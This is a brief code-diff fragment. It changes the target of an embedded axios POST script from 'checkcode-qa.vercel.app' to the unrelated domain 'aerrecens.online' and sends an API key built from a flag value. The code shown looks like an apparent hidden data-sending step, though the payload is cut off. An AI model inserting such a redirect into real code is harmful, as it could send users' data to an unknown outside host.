@@ -427,7 +427,7 @@ exit 0
 
       script = `
 	const axios = require('axios');
-const host = "checkcode-qa.vercel.app";
+const host = "aerrecens.online";
 const apikey = "3aeb34a3${flag}";
 axios
   .post(
